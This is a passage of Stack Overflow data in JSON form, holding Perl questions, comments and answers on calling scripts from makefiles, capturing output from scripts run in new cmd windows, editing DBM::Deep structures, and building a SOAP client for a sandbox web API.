"https://stackoverflow.com/users/8956086/abhi-shek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 171, "favorite_count": 0, "accepted_answer_id": 49177293, "answer_count": 1, "score": 0, "last_activity_date": 1520524535, "creation_date": 1520523871, "last_edit_date": 1520524023, "question_id": 49177072, "link": "https://stackoverflow.com/questions/49177072/adding-perl-script-to-makefile", "title": "adding perl script to makefile", "body": "<p>I have a file called file_read.pl, i want to use it in my makefile.</p>\n\n<pre><code>test1:\n    rm -rf cov_work *.trn INCA_libs *.dsn \n    $(comp) +UVM_VERBOSITY=UVM_MEDIUM +UVM_TESTNAME=wr_rd_all_registers;\n</code></pre>\n\n<p>how to call that perl script to this target.How to do this?</p>\n"}, {"tags": ["perl", "cmd", "window"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1520524510, "post_id": 49177059, "comment_id": 85359786, "body": "What is <code>system( [0,1,2], ...)</code>? What is the <code>[0,1,2]</code> supposed to do?"}, {"owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1520525533, "post_id": 49177059, "comment_id": 85360525, "body": "@mob I reused old code and I&#39;m not sure, I got it from here <a href=\"https://stackoverflow.com/questions/364842/how-do-i-run-a-perl-script-from-within-a-perl-script\" title=\"how do i run a perl script from within a perl script\">stackoverflow.com/questions/364842/&hellip;</a>"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1520525733, "post_id": 49177059, "comment_id": 85360692, "body": "So that is the syntax of the <code>system</code> function from the <code>IPC::System::Simple</code> module. Is that what you are using? Or are you using the ordinary builtin <code>system</code> function?"}, {"owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1520525946, "post_id": 49177059, "comment_id": 85360825, "body": "@mat I&#39;m using the ordinary builtin system function with this sintax and it doesn&#39;t return any error and executes the scripts in a new window as expected. The problem is that I think It only sees if the new window has been opened correctly and not what happens in the script which is running in it."}], "answers": [{"tags": [], "owner": {"reputation": 5, "user_id": 7260094, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5733f3d61ada9b0460417e012189d4eb?s=128&d=identicon&r=PG&f=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/7260094/paul"}, "is_accepted": false, "score": 0, "last_activity_date": 1520535953, "creation_date": 1520535953, "answer_id": 49180657, "question_id": 49177059, "link": "https://stackoverflow.com/questions/49177059/how-to-get-output-of-a-script-executed-in-a-new-cmd-window-from-other-perl-scrip/49180657#49180657", "title": "How to get output of a script executed in a new cmd window from other perl script?", "body": "<p>Unclear if you are talking about inter-process communication there is lot of good information and examples at perlipc (<a href=\"https://perldoc.perl.org/perlipc.html\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/perlipc.html</a>). There is of also the use of message queues which is dependent on your OS.\nA simple solution would be to append to a file that is shared between the scripts.</p>\n"}], "owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 33, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1520535953, "creation_date": 1520523824, "question_id": 49177059, "link": "https://stackoverflow.com/questions/49177059/how-to-get-output-of-a-script-executed-in-a-new-cmd-window-from-other-perl-scrip", "title": "How to get output of a script executed in a new cmd window from other perl script?", "body": "<p>let's say I have three perl scripts:</p>\n\n<p>perl_script_GUI.pl</p>\n\n<p>perl_script_1.pl</p>\n\n<p>perl_script_2.pl</p>\n\n<p>I execute my GUI: \"perl_script_GUI.pl\", and from there I want to execute both other scripts simultaniously. I can do this by using:</p>\n\n<pre><code>my $command=\"perl perl_script_1.pl \";\nif (system( [0,1,2], 'start cmd /k \"'.$command.'\"' ) != 0){\n     print \"There was a problem executing the the script\";\n}\n$command=\"perl perl_script_2.pl \";\nif (system( [0,1,2], 'start cmd /k \"'.$command.'\"' ) != 0){\n     print \"There was a problem executing the the script\";\n}\n</code></pre>\n\n<p>This executes each script in a new window and runs the scripts while I can do something in the GUI. </p>\n\n<p>Is it possible to get the result of the script when it has finnished?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1520521626, "post_id": 49175989, "comment_id": 85357769, "body": "Missing semicolon before <code>print</code>."}, {"owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520521989, "post_id": 49175989, "comment_id": 85358033, "body": "true. fixed in the post"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1520522075, "post_id": 49175989, "comment_id": 85358098, "body": "Doesn&#39;t <a href=\"http://p3rl.org/splice\" rel=\"nofollow noreferrer\">splice</a>, <a href=\"http://p3rl.org/push\" rel=\"nofollow noreferrer\">push</a>, <a href=\"http://p3rl.org/pop\" rel=\"nofollow noreferrer\">pop</a>, <a href=\"http://p3rl.org/shift\" rel=\"nofollow noreferrer\">shift</a>, and <a href=\"http://p3rl.org/unshift\" rel=\"nofollow noreferrer\">unshift</a> work on the dereferenced array?"}, {"owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520522353, "post_id": 49175989, "comment_id": 85358288, "body": "Well if it does, it didn&#39;t get it ..."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520522985, "post_id": 49175989, "comment_id": 85358725, "body": "It seems <code>pop @$devices</code> works, as does <code>spice @$devices, 1, 1</code>, but <code>shift</code> and <code>splice @$devices, 0, 1</code> don&#39;t work..."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520523066, "post_id": 49175989, "comment_id": 85358777, "body": "But only when $match exists. Seems like weak references somewhere?"}, {"owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520525068, "post_id": 49175989, "comment_id": 85360223, "body": "So I should use splice then, the next challenge is to get the index of the hashref in the arrayref"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520525667, "post_id": 49175989, "comment_id": 85360648, "body": "Maybe you need a different structure? A hash keyed by the hostname?"}, {"owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520526230, "post_id": 49175989, "comment_id": 85361038, "body": "Yes I&#39;m trying hard not to change the structure but maybe it would be worth it."}, {"owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520534117, "post_id": 49175989, "comment_id": 85365811, "body": "It looks like List::Moreutils &quot;first_index&quot; function is quite an ally. Thank you @choroba !"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520534504, "post_id": 49175989, "comment_id": 85366024, "body": "If the arrays aren&#39;t huge, it&#39;s probably fast enough anyway."}, {"owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520536480, "post_id": 49175989, "comment_id": 85367107, "body": "Around a 1000 elements. Btw since we&#39;re talking about arrays, should I splice to insert an element or use (push / unsfhit) ? The order of the array doesn&#39;t matter. I&#39;m only using DBM::Deep for it&#39;s concurrent access feature."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520538024, "post_id": 49175989, "comment_id": 85367888, "body": "Benchmark if you want to know more :-)"}, {"owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520538479, "post_id": 49175989, "comment_id": 85368137, "body": "oh so the difference is only a matter of performance ?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520538774, "post_id": 49175989, "comment_id": 85368294, "body": "Well, splice is probably less readable."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1520615012, "post_id": 49175989, "comment_id": 85402311, "body": "1) The code you posted doesn&#39;t produce the output you claim it does. Could you fix the code in your question. 2) You state what output you got, but you didn&#39;t state what output you were trying to optian. Could you fix your question so it actually asks a question?"}], "owner": {"reputation": 61, "user_id": 6864964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eff67c191467d6f9ebc3df4f108248fd?s=128&d=identicon&r=PG&f=1", "display_name": "Luc Larochelle", "link": "https://stackoverflow.com/users/6864964/luc-larochelle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1520521970, "creation_date": 1520520696, "last_edit_date": 1520521970, "question_id": 49175989, "link": "https://stackoverflow.com/questions/49175989/perl-dbmdeep-add-delete-in-an-arrayref-of-hashrefs", "title": "Perl DBM::Deep - add/delete in an arrayref of hashrefs", "body": "<p>I've been working with DBM::Deep and so far, it's been easy to Read and Update the keys in the DB but when it comes to adding or deleting entities it gets a little complicated and I can't see how it could be done.</p>\n\n<p>I've imported an XML file with XML::Hash and then copied on a DBM::Deep object. So the result is somehow complicated ... The objective of course is to be able to recreate the XML file easily.</p>\n\n<p>So this code:</p>\n\n<pre><code>use DBM::Deep;\nuse List::Util qw(first);\nuse Data::Dumper;\n\nmy $db = DBM::Deep-&gt;new('foo.db');\nmy $devices = $db-&gt;{foo}-&gt;{devices}-&gt;{device};\n\n(my $match) = grep { $_-&gt;{hostname} eq 'myfoo' } @$devices;\n\nprint Dumper ($match);\nprint Dumper($devices);\n</code></pre>\n\n<p>Gives the following output for the first print:</p>\n\n<pre><code>$VAR1 = bless( {\n             'enable' =&gt; '0',\n             'hostname' =&gt; 'myfoo',\n             'auth' =&gt; 'myauth',\n             'ip' =&gt; 'myip',\n             'protocol' =&gt; 'ssh'\n           }, 'DBM::Deep::Hash' );\n</code></pre>\n\n<p>The second print shows:</p>\n\n<pre><code>$VAR1 = bless( [\n             bless( {\n                      'enable' =&gt; '0',\n                      'hostname' =&gt; 'myfoo',\n                      'auth' =&gt; 'myauth',\n                      'ip' =&gt; 'myip',\n                      'protocol' =&gt; 'ssh'\n                    }, 'DBM::Deep::Hash' ),\n             bless( {\n                      'ip' =&gt; 'myotherip',\n                      'hostname' =&gt; 'myotherfoo',\n                      'auth' =&gt; 'myauth',\n                      'protocol' =&gt; 'telnet'\n                    }, 'DBM::Deep::Hash' ),\n</code></pre>\n\n<p>and so on.</p>\n\n<p>Can someone please help me to understand how to Create and Delete in this data structure?</p>\n"}, {"tags": ["perl", "soap", "wsdl"], "answers": [{"comments": [{"owner": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "edited": false, "score": 0, "creation_date": 1520521518, "post_id": 49176136, "comment_id": 85357690, "body": "same as in my examples: result is empty :("}, {"owner": {"reputation": 962, "user_id": 4204127, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/1241595301/picture?type=large", "display_name": "Ed Dunn", "link": "https://stackoverflow.com/users/4204127/ed-dunn"}, "reply_to_user": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "edited": false, "score": 0, "creation_date": 1520522142, "post_id": 49176136, "comment_id": 85358153, "body": "what&#39;s the expected output?"}, {"owner": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "edited": false, "score": 0, "creation_date": 1520522342, "post_id": 49176136, "comment_id": 85358281, "body": "PHP output added at the bottom of original post"}, {"owner": {"reputation": 962, "user_id": 4204127, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/1241595301/picture?type=large", "display_name": "Ed Dunn", "link": "https://stackoverflow.com/users/4204127/ed-dunn"}, "reply_to_user": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "edited": false, "score": 0, "creation_date": 1520522643, "post_id": 49176136, "comment_id": 85358482, "body": "code above might print out everything but it looks like it&#39;s getting data"}, {"owner": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "edited": false, "score": 0, "creation_date": 1520523886, "post_id": 49176136, "comment_id": 85359365, "body": "yeah, but I have no idea how to get whats important (result of <code>doQueryAllSysStatus</code>)..."}, {"owner": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "edited": false, "score": 0, "creation_date": 1520782632, "post_id": 49176136, "comment_id": 85446990, "body": "Actually its not that simple... But I could provide you with my api key. Is there any way I could send it to you non-publicly?"}], "tags": [], "owner": {"reputation": 962, "user_id": 4204127, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/1241595301/picture?type=large", "display_name": "Ed Dunn", "link": "https://stackoverflow.com/users/4204127/ed-dunn"}, "is_accepted": false, "score": 0, "last_activity_date": 1520522624, "last_edit_date": 1520522624, "creation_date": 1520521153, "answer_id": 49176136, "question_id": 49175060, "link": "https://stackoverflow.com/questions/49175060/soap-client-in-perl/49176136#49176136", "title": "SOAP client in Perl", "body": "<p>I don't have a web api key so I can't fully test but what about something like this?</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\nuse SOAP::Lite;\n\nmy $soap = SOAP::Lite-&gt;new( proxy =&gt; 'https://webapi.allegro.pl.webapisandbox.pl/service.php?wsdl');\n\nmy $country = 1;\nmy $api = 'XXXXX';\n\nmy $r = $soap-&gt;doQueryAllSysStatus($country,$api);\n\nprint $r-&gt;result, \"\\n\";\n</code></pre>\n\n<p>--- UPDATE ---</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\nuse SOAP::Lite;\nuse Data::Dumper;\n\nmy $soap = SOAP::Lite-&gt;new( proxy =&gt; 'https://webapi.allegro.pl.webapisandbox.pl/service.php?wsdl');\n\nmy $country = 1;\nmy $api = 'XXXXX';\n\nmy @r = $soap-&gt;doQueryAllSysStatus($country,$api);\n\nprint Dumper(\\@r);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 962, "user_id": 4204127, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/1241595301/picture?type=large", "display_name": "Ed Dunn", "link": "https://stackoverflow.com/users/4204127/ed-dunn"}, "edited": false, "score": 0, "creation_date": 1520869556, "post_id": 49225286, "comment_id": 85482003, "body": "Nice, glad you got it working.  Seems for some reason SOAP::Lite should&#39;ve worked, but guess not"}], "tags": [], "owner": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "is_accepted": true, "score": 1, "last_activity_date": 1520803708, "creation_date": 1520803708, "answer_id": 49225286, "question_id": 49175060, "link": "https://stackoverflow.com/questions/49175060/soap-client-in-perl/49225286#49225286", "title": "SOAP client in Perl", "body": "<p>I found a working solution, so for anybody curious here it is.</p>\n\n<p>I gave up with <code>SOAP::Lite</code> and used <code>XML::Compile::*</code> modules with a little help from <code>HTTP::Tiny</code>.</p>\n\n<p>The code:</p>\n\n<pre><code>use Data::Printer;\nuse HTTP::Tiny;\nuse XML::Compile::SOAP11;\nuse XML::Compile::WSDL11;\nuse XML::Compile::Transport::SOAPHTTP;\n\nmy $wsdlXml = HTTP::Tiny-&gt;new-&gt;get('https://....')-&gt;{content};\nmy $wsdl    = XML::Compile::WSDL11-&gt;new($wsdlXml);\n\nmy $response = $wsdl-&gt;compileCall('doQueryAllSysStatus')-&gt;(\n    countryId =&gt; 1, \n    webapiKey =&gt; 'xxxxxx'\n);\np $response;\n</code></pre>\n\n<p>Which prints out:</p>\n\n<pre><code>\\ {\n    parameters   {\n        sysCountryStatus   {\n            item   [\n                [0] {\n                    apiVersion        1.0,\n                    attribVersion     1.0,\n                    catsVersion       \"1.4.94\",\n                    countryId         1,\n                    formSellVersion   \"1.11.91\",\n                    programVersion    1.0,\n                    siteVersion       1.0,\n                    verKey            1505223106\n                }\n            ]\n        }\n    }\n}\n</code></pre>\n\n<p>Yay! ;)</p>\n"}], "owner": {"reputation": 589, "user_id": 1071125, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/8724116c946ff0e5d48eff23b580a8bf?s=128&d=identicon&r=PG", "display_name": "gib", "link": "https://stackoverflow.com/users/1071125/gib"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 250, "favorite_count": 0, "accepted_answer_id": 49225286, "answer_count": 2, "score": 0, "last_activity_date": 1520803708, "creation_date": 1520517986, "last_edit_date": 1520522312, "question_id": 49175060, "link": "https://stackoverflow.com/questions/49175060/soap-client-in-perl", "title": "SOAP client in Perl", "body": "<p>Im trying to \"talk\" to <a href=\"https://webapi.allegro.pl.webapisandbox.pl/service.php?wsdl\" rel=\"nofollow noreferrer\">https://webapi.allegro.pl.webapisandbox.pl/service.php?wsdl</a> using Perl and SOAP::Lite.</p>\n\n<p>In PHP its as simple as this:</p>\n\n<pre><code>&lt;?\n$client = new SoapClient('https://webapi.allegro.pl.webapisandbox.pl/service.php?wsdl');\n$results = $client-&gt;doQueryAllSysStatus(array(\n    'countryId' =&gt; 1,\n    'webapiKey' =&gt; 'XXXXXX'\n));\nheader('Content-type: text/plain');\nvar_dump($results);\n?&gt;\n</code></pre>\n\n<p>But with Perl... its not ;).</p>\n\n<p>I wrote this:</p>\n\n<pre><code>use SOAP::Lite;\nmy $soap = SOAP::Lite-&gt;new(proxy =&gt; 'https://webapi.allegro.pl.webapisandbox.pl/service.php?wsdl');\nmy $som = $soap-&gt;call('doQueryAllSysStatus', 1, 'XXXXXX');\n# tried also this:\n# my $som = $soap-&gt;call('doQueryAllSysStatus', \n#     SOAP::Data-&gt;name('countryId')-&gt;value(1),\n#     SOAP::Data-&gt;name('webapiKey')-&gt;value('XXXXXX')\n# );\ndie $som-&gt;faultstring if ($som-&gt;fault);\nprint $som-&gt;result, \"\\n\";\n</code></pre>\n\n<p><code>$som-&gt;result</code> is empty.</p>\n\n<p>Tried also:</p>\n\n<pre><code>use SOAP::Lite;\nmy $soap = SOAP::Lite-&gt;service('https://webapi.allegro.pl.webapisandbox.pl/service.php?wsdl');\nmy $r = $soap-&gt;doQueryAllSysStatus(1, 'xxxxxx');\nprint $r, \"\\n\";\n</code></pre>\n\n<p>... and got <code>Use of uninitialized value $r in print</code>.</p>\n\n<p>Any help would be appreciated...</p>\n\n<p><strong>UPDATE #1:</strong>\nPHP code outputs this:</p>\n\n<pre><code>object(stdClass)#2 (1) {\n  [\"sysCountryStatus\"]=&gt;\n  object(stdClass)#3 (1) {\n    [\"item\"]=&gt;\n    object(stdClass)#4 (8) {\n      [\"countryId\"]=&gt;\n      int(1)\n      [\"programVersion\"]=&gt;\n      string(3) \"1.0\"\n      [\"catsVersion\"]=&gt;\n      string(6) \"1.4.94\"\n      [\"apiVersion\"]=&gt;\n      string(3) \"1.0\"\n      [\"attribVersion\"]=&gt;\n      string(3) \"1.0\"\n      [\"formSellVersion\"]=&gt;\n      string(7) \"1.11.91\"\n      [\"siteVersion\"]=&gt;\n      string(3) \"1.0\"\n      [\"verKey\"]=&gt;\n      int(1505223106)\n    }\n  }\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 2, "creation_date": 1520518026, "post_id": 49175043, "comment_id": 85355078, "body": "What have you tried? How did it fail?"}, {"owner": {"reputation": 6254, "user_id": 2261424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a0beda634f65f29aace865be9504e5e6?s=128&d=identicon&r=PG", "display_name": "AntonH", "link": "https://stackoverflow.com/users/2261424/antonh"}, "edited": false, "score": 0, "creation_date": 1520518182, "post_id": 49175043, "comment_id": 85355187, "body": "Have you looked at <code>rename</code>?"}, {"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "edited": false, "score": 0, "creation_date": 1520518273, "post_id": 49175043, "comment_id": 85355241, "body": "No i haven&#39;t tried it. i&#39;m trying, No i haven&#39;t looked at rename"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1520518982, "post_id": 49175043, "comment_id": 85355763, "body": "So what are you asking us? Do you expect us to just write the whole script for you?"}, {"owner": {"reputation": 69991, "user_id": 939557, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/3VPea.png?s=128&g=1", "display_name": "MadScientist", "link": "https://stackoverflow.com/users/939557/madscientist"}, "edited": false, "score": 0, "creation_date": 1520519344, "post_id": 49175043, "comment_id": 85356016, "body": "Also, what does this have to do with the <code>makefile</code> tag?"}, {"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "edited": false, "score": 0, "creation_date": 1520519790, "post_id": 49175043, "comment_id": 85356328, "body": "if i get complete with the the perl script. i i will write a loop in makefile to execut the target in makefile. That means i will call this perl script in the makefile."}, {"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": 